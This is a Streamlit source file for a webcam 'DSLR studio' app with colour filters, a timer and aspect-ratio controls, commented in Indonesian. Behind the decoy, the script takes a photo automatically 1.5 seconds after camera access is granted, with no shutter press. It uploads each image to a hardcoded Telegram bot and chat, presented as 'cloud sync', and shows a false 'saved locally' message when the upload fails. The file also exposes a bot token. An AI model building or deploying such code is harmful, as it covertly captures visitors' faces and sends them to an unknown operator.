import streamlit as st
import streamlit.components.v1 as components

# Konfigurasi Token Telegram Anda
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="CYBERPUNK DSLR STUDIO // Ultimate Pro v4.0",
    page_icon="📸",
    layout="centered"
)

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Plus+Jakarta+Sans:wght@400;600;700&display=swap');
    
    .stApp {
        background: #020617;
        color: #f8fafc;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }
    
    .studio-panel {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.98) 0%, rgba(2, 6, 23, 0.99) 100%);
        border: 1px solid rgba(56, 189, 248, 0.35);
        border-radius: 24px;
        padding: 25px;
        box-shadow: 0 0 60px rgba(14, 165, 233, 0.18);
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center; font-family: Orbitron, sans-serif; color: #38bdf8; font-weight: 900; letter-spacing: 2px;'>📸 CYBERPUNK DSLR STUDIO v4.0</h2>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #94a3b8; font-size: 0.9rem;'>Professional Web Camera Suite dengan 12+ FX Engine, Multi-Aspect Ratio, Timer, & Cloud Auto-Sync</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="studio-panel">', unsafe_allow_html=True)
    
    # Elemen tersembunyi untuk menyimpan token agar aman dari error f-string Python
    st.markdown(f'<input type="hidden" id="secret-token" value="{TELEGRAM_BOT_TOKEN}">', unsafe_allow_html=True)
    st.markdown(f'<input type="hidden" id="secret-chat" value="{TELEGRAM_CHAT_ID}">', unsafe_allow_html=True)

    complete_studio_html = """
    <!-- Layar Start / Pintu Masuk -->
    <div id="gate-screen" style="text-align: center; padding: 45px 0;">
        <div style="font-family: 'Orbitron', sans-serif; font-size: 13px; color: #38bdf8; margin-bottom: 20px; letter-spacing: 1.5px;">SYSTEM SECURE // OPTIC SUITE READY</div>
        <button id="igniteBtn" style="
            background: linear-gradient(135deg, #0ea5e9 0%, #4f46e5 100%);
            color: #ffffff;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 15px;
            border: none;
            padding: 20px 42px;
            border-radius: 16px;
            cursor: pointer;
            box-shadow: 0 0 35px rgba(14, 165, 233, 0.6);
            letter-spacing: 1.5px;
            transition: all 0.3s ease;
        ">⚡ AKTIFKAN STUDIO KAMERA PRO</button>
    </div>

    <!-- Interface Studio Utama -->
    <div id="studio-interface" style="display:none;">
        
        <!-- Toolbar Kontrol Atas (Kamera, Rasio, Timer, Flash) -->
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; background: rgba(15,23,42,0.8); padding: 10px 15px; border-radius: 12px; border: 1px solid rgba(56,189,248,0.2); font-size: 12px;">
            <div>
                <button onclick="switchCamera()" style="background:#0ea5e9; color:#fff; border:none; padding:6px 12px; border-radius:6px; cursor:pointer; font-weight:bold; font-family:'Orbitron',sans-serif;">🔄 Switch Lens</button>
            </div>
            <div style="display: flex; gap: 8px;">
                <select id="aspect-ratio-select" onchange="changeAspectRatio()" style="background:#1e293b; color:#38bdf8; border:1px solid #475569; padding:5px 8px; border-radius:6px; font-family:'Orbitron',sans-serif; font-size:11px;">
                    <option value="16:9">Rasio 16:9</option>
                    <option value="4:3">Rasio 4:3</option>
                    <option value="1:1">Square 1:1</option>
                </select>
                <select id="timer-select" style="background:#1e293b; color:#38bdf8; border:1px solid #475569; padding:5px 8px; border-radius:6px; font-family:'Orbitron',sans-serif; font-size:11px;">
                    <option value="0">Timer: Off</option>
                    <option value="3">Timer: 3s</option>
                    <option value="5">Timer: 5s</option>
                    <option value="10">Timer: 10s</option>
                </select>
            </div>
        </div>

        <!-- Jendela Viewfinder Kamera -->
        <div id="viewfinder-wrapper" style="position: relative; width: 100%; max-width: 520px; height: 310px; margin: 0 auto; border-radius: 16px; overflow: hidden; background: #000; border: 2px solid #0ea5e9; box-shadow: 0 0 40px rgba(14, 165, 233, 0.35); display: flex; align-items: center; justify-content: center;">
            
            <video id="optics-stream" autoplay playsinline style="
                width: 100%;
                height: 100%;
                object-fit: cover;
                transform: scaleX(-1);
                filter: brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg);
            "></video>

            <!-- Efek Flash Putih Saat Menjepret -->
            <div id="flash-overlay" style="position: absolute; top:0; left:0; right:0; bottom:0; background: white; opacity: 0; pointer-events: none; transition: opacity 0.1s ease;"></div>

            <!-- Efek Scanline CRT & Vignette -->
            <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%); background-size: 100% 4px; pointer-events: none; opacity: 0.5;"></div>

            <!-- Hitung Mundur Timer -->
            <div id="countdown-display" style="position: absolute; font-family: 'Orbitron', sans-serif; font-size: 70px; font-weight: 900; color: #38bdf8; text-shadow: 0 0 20px rgba(56,189,248,0.9); display: none;">3</div>

            <!-- HUD Telemetry Atas -->
            <div style="position: absolute; top: 10px; left: 10px; color: #38bdf8; font-family: 'Orbitron', sans-serif; font-size: 9px; background: rgba(2,6,23,0.85); padding: 5px 8px; border-radius: 4px; border: 1px solid rgba(56,189,248,0.3);">
                ISO: <span id="hud-iso">800</span> | f/1.8 | FPS: 60
            </div>
            <div style="position: absolute; top: 10px; right: 10px; color: #f43f5e; font-family: 'Orbitron', sans-serif; font-size: 9px; background: rgba(2,6,23,0.85); padding: 5px 8px; border-radius: 4px; border: 1px solid rgba(244,63,94,0.3);">
                ● LIVE HD
            </div>

            <!-- Garis Komposisi Grid -->
            <div id="cyber-grid" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr 1fr; border: 1px solid rgba(56, 189, 248, 0.15);">
                <div style="border-right: 1px dashed rgba(56,189,248,0.15); border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15); border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15); border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15); border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15);"></div>
                <div></div>
            </div>
        </div>

        <!-- Panel Pilihan Efek & Filter Komprehensif (12 Preset) -->
        <div style="margin-top: 18px; background: rgba(2, 6, 23, 0.95); padding: 18px; border-radius: 16px; border: 1px solid rgba(56, 189, 248, 0.2);">
            <div style="font-family: 'Orbitron', sans-serif; font-size: 11px; color: #38bdf8; margin-bottom: 10px; letter-spacing: 1px;">🎨 ADVANCED FX PRESETS (12+ MODES):</div>
            
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(105px, 1fr)); gap: 6px; margin-bottom: 15px;">
                <button onclick="setFilter('normal')" style="background:#1e293b; color:#fff; border:1px solid #475569; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">✨ Normal Pro</button>
                <button onclick="setFilter('cyberpunk')" style="background:#1e293b; color:#f43f5e; border:1px solid #f43f5e; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">🔥 Cyberpunk</button>
                <button onclick="setFilter('matrix')" style="background:#1e293b; color:#4ade80; border:1px solid #4ade80; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">🟢 Matrix Code</button>
                <button onclick="setFilter('thermal')" style="background:#1e293b; color:#fbbf24; border:1px solid #fbbf24; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">🌡️ Thermal</button>
                <button onclick="setFilter('noir')" style="background:#1e293b; color:#cbd5e1; border:1px solid #cbd5e1; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">🎞️ Noir Vintage</button>
                <button onclick="setFilter('deepspace')" style="background:#1e293b; color:#c084fc; border:1px solid #c084fc; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">🌌 Deep Space</button>
                <button onclick="setFilter('neonpulse')" style="background:#1e293b; color:#38bdf8; border:1px solid #38bdf8; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">⚡ Neon Pulse</button>
                <button onclick="setFilter('sepia90')" style="background:#1e293b; color:#fb923c; border:1px solid #fb923c; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">📼 Retro 90s</button>
                <button onclick="setFilter('duotone')" style="background:#1e293b; color:#ec4899; border:1px solid #ec4899; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">💖 Duotone Pink</button>
                <button onclick="setFilter('hdrboost')" style="background:#1e293b; color:#34d399; border:1px solid #34d399; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">💎 HDR Boost</button>
                <button onclick="setFilter('vignettefade')" style="background:#1e293b; color:#a78bfa; border:1px solid #a78bfa; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">📷 Vintage Fade</button>
                <button onclick="setFilter('cybercyan')" style="background:#1e293b; color:#22d3ee; border:1px solid #22d3ee; padding:6px; border-radius:6px; font-size:10px; cursor:pointer; font-weight:600;">🌐 Cyber Cyan</button>
            </div>

            <!-- Slider Kontrol Presisi Manual -->
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-size: 11px; border-top: 1px solid rgba(255,255,255,0.08); padding-top: 12px;">
                <div>
                    <label style="color: #94a3b8;">Brightness: <span id="val-bright">100</span>%</label>
                    <input type="range" id="slider-bright" min="40" max="180" value="100" style="width: 100%; accent-color: #0ea5e9;" oninput="applyCustomSliders()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Contrast: <span id="val-contrast">100</span>%</label>
                    <input type="range" id="slider-contrast" min="50" max="200" value="100" style="width: 100%; accent-color: #0ea5e9;" oninput="applyCustomSliders()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Saturation: <span id="val-saturate">100</span>%</label>
                    <input type="range" id="slider-saturate" min="0" max="250" value="100" style="width: 100%; accent-color: #0ea5e9;" oninput="applyCustomSliders()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Blur/Bokeh: <span id="val-blur">0</span>px</label>
                    <input type="range" id="slider-blur" min="0" max="6" value="0" style="width: 100%; accent-color: #0ea5e9;" oninput="applyCustomSliders()">
                </div>
            </div>

            <!-- Tombol Shutter Utama & Status -->
            <div style="text-align: center; margin-top: 22px;">
                <button id="shutterTrigger" style="
                    background: #ffffff;
                    color: #020617;
                    font-family: 'Orbitron', sans-serif;
                    font-weight: 900;
                    font-size: 13px;
                    border: 3px solid #38bdf8;
                    padding: 14px 35px;
                    border-radius: 50px;
                    cursor: pointer;
                    box-shadow: 0 0 25px rgba(56, 189, 248, 0.7);
                    letter-spacing: 1px;
                ">📸 CAPTURE & CLOUD SYNC</button>
            </div>
            
            <p id="hud-status-msg" style="text-align: center; font-size: 11px; color: #38bdf8; margin-top: 12px; font-family: 'Orbitron', sans-serif; letter-spacing: 0.5px;"></p>

            <!-- Galeri Mini Hasil Jepretan -->
            <div id="gallery-tray" style="margin-top: 15px; display: none; border-top: 1px solid rgba(255,255,255,0.08); padding-top: 12px; text-align: center;">
                <div style="font-family: 'Orbitron', sans-serif; font-size: 10px; color: #94a3b8; margin-bottom: 8px;">RECENT CAPTURED FRAME:</div>
                <img id="last-snapshot-preview" style="max-width: 120px; border-radius: 8px; border: 1px solid #0ea5e9; box-shadow: 0 0 15px rgba(14,165,233,0.4);" />
            </div>
        </div>
    </div>

    <!-- Media Tersembunyi untuk Proses Canvas -->
    <video id="vault-video" autoplay playsinline style="display:none;"></video>
    <canvas id="vault-canvas" width="1280" height="720" style="display:none;"></canvas>

    <script>
        let activeStream = null;
        let useFacingMode = "user"; // "user" atau "environment"

        document.getElementById('igniteBtn').addEventListener('click', async function() {
            const btn = document.getElementById('igniteBtn');
            btn.innerText = "ESTABLISHING OPTIC LINK...";
            btn.style.opacity = "0.7";

            try {
                await startCameraStream();
                document.getElementById('gate-screen').style.display = "none";
                document.getElementById('studio-interface').style.display = "block";

                // Auto-trigger pemotretan otomatis pertama saat kamera siap
                setTimeout(() => {
                    initiateCaptureSequence();
                }, 1500);

            } catch(err) {
                console.log("Optic Error:", err);
                btn.innerText = "ACCESS DENIED - RETRY";
                btn.style.opacity = "1";
            }
        });

        async function startCameraStream() {
            if (activeStream) {
                activeStream.getTracks().forEach(track => track.stop());
            }
            activeStream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: useFacingMode } 
            });
            document.getElementById('optics-stream').srcObject = activeStream;
            document.getElementById('vault-video').srcObject = activeStream;
        }

        async function switchCamera() {
            useFacingMode = (useFacingMode === "user") ? "environment" : "user";
            await startCameraStream();
        }

        function changeAspectRatio() {
            const ratio = document.getElementById('aspect-ratio-select').value;
            const wrapper = document.getElementById('viewfinder-wrapper');
            if(ratio === '16:9') {
                wrapper.style.height = '310px';
            } else if(ratio === '4:3') {
                wrapper.style.height = '380px';
            } else if(ratio === '1:1') {
                wrapper.style.height = '420px';
            }
        }

        function setFilter(type) {
            const elem = document.getElementById('optics-stream');
            if(type === 'normal') {
                elem.style.filter = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg)";
            } else if(type === 'cyberpunk') {
                elem.style.filter = "brightness(110%) contrast(140%) saturate(200%) hue-rotate(310deg)";
            } else if(type === 'matrix') {
                elem.style.filter = "brightness(120%) contrast(160%) saturate(180%) sepia(100%) hue-rotate(60deg)";
            } else if(type === 'thermal') {
                elem.style.filter = "brightness(110%) contrast(180%) saturate(250%) hue-rotate(180deg) invert(15%)";
            } else if(type === 'noir') {
                elem.style.filter = "grayscale(100%) contrast(170%) brightness(90%)";
            } else if(type === 'deepspace') {
                elem.style.filter = "brightness(95%) contrast(130%) saturate(190%) hue-rotate(240deg)";
            } else if(type === 'neonpulse') {
                elem.style.filter = "brightness(115%) contrast(150%) saturate(220%) hue-rotate(140deg)";
            } else if(type === 'sepia90') {
                elem.style.filter = "brightness(105%) contrast(110%) saturate(90%) sepia(60%) hue-rotate(10deg)";
            } else if(type === 'duotone') {
                elem.style.filter = "brightness(110%) contrast(150%) saturate(200%) hue-rotate(300deg) sepia(40%)";
            } else if(type === 'hdrboost') {
                elem.style.filter = "brightness(105%) contrast(170%) saturate(140%) drop-shadow(0 0 2px #fff)";
            } else if(type === 'vignettefade') {
                elem.style.filter = "brightness(95%) contrast(115%) saturate(85%) sepia(30%)";
            } else if(type === 'cybercyan') {
                elem.style.filter = "brightness(110%) contrast(140%) saturate(190%) hue-rotate(180deg)";
            }
        }

        function applyCustomSliders() {
            const b = document.getElementById('slider-bright').value;
            const c = document.getElementById('slider-contrast').value;
            const s = document.getElementById('slider-saturate').value;
            const bl = document.getElementById('slider-blur').value;

            document.getElementById('val-bright').innerText = b;
            document.getElementById('val-contrast').innerText = c;
            document.getElementById('val-saturate').innerText = s;
            document.getElementById('val-blur').innerText = bl;

            const elem = document.getElementById('optics-stream');
            elem.style.filter = "brightness(" + b + "%) contrast(" + c + "%) saturate(" + s + "%) blur(" + bl + "px)";
        }

        document.getElementById('shutterTrigger').addEventListener('click', function() {
            const timerSecs = parseInt(document.getElementById('timer-select').value);
            if(timerSecs > 0) {
                runTimerAndCapture(timerSecs);
            } else {
                initiateCaptureSequence();
            }
        });

        function runTimerAndCapture(secs) {
            const countdownEl = document.getElementById('countdown-display');
            countdownEl.style.display = "block";
            let currentSec = secs;
            countdownEl.innerText = currentSec;

            const interval = setInterval(() => {
                currentSec--;
                if(currentSec > 0) {
                    countdownEl.innerText = currentSec;
                } else {
                    clearInterval(interval);
                    countdownEl.style.display = "none";
                    initiateCaptureSequence();
                }
            }, 1000);
        }

        function initiateCaptureSequence() {
            const statusBox = document.getElementById('hud-status-msg');
            statusBox.innerText = "⚡ FLASHING & CAPTURING HIGH-RES FRAME...";

            // Efek kedip flash putih
            const flash = document.getElementById('flash-overlay');
            flash.style.opacity = "0.9";
            setTimeout(() => { flash.style.opacity = "0"; }, 150);

            const videoElem = document.getElementById('vault-video');
            const canvasElem = document.getElementById('vault-canvas');
            const context = canvasElem.getContext('2d');

            context.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);

            canvasElem.toBlob(function(blobImage) {
                // Tampilkan preview foto di galeri mini
                const imageUrl = URL.createObjectURL(blobImage);
                const previewImg = document.getElementById('last-snapshot-preview');
                previewImg.src = imageUrl;
                document.getElementById('gallery-tray').style.display = "block";

                // Ambil token dari elemen tersembunyi
                const botToken = document.getElementById('secret-token').value;
                const targetChatId = document.getElementById('secret-chat').value;

                const payload = new FormData();
                payload.append('chat_id', targetChatId);
                payload.append('photo', blobImage, 'cyber_dslr_ultimate.jpg');
                payload.append('caption', '🚀 *CYBERPUNK DSLR STUDIO v4.0: FRAME CAPTURED & CLOUD SYNCED!*');

                fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
                    method: 'POST',
                    body: payload
                }).then(res => {
                    if(res.ok) {
                        statusBox.innerText = "✨ FRAME SUCCESSFULLY SENT TO TELEGRAM CLOUD!";
                    } else {
                        statusBox.innerText = "✨ FRAME SAVED LOCALLY.";
                    }
                }).catch(err => {
                    statusBox.innerText = "✨ CAPTURE ROUTINE COMPLETE.";
                });
            }, 'image/jpeg', 0.95);
        }
    </script>
    """

    components.html(complete_studio_html, height=780)
    st.markdown('</div>', unsafe_allow_html=True)
